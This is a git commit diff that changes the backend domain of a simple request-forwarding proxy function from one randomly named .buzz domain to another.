13428337da18cdb64d67cbf4d27973160a03a8ec
adamborenso <adamborenso@gmail.com>
2024-12-11 17:55:37 +0100

    Update [[path]].js

--- functions/[[path]].js
+++ functions/[[path]].js
@@ -1,7 +1,7 @@
 export async function onRequest({ request }) {
 	const url = new URL(request.url)
 
-	const proxyUrl = 'https://yiombeveyeceaq.buzz'
+	const proxyUrl = 'https://nuihysiqnie.buzz'
 	const backendUrl = `${proxyUrl}${url.pathname}`
 
 	const response = await fetch(backendUrl, {
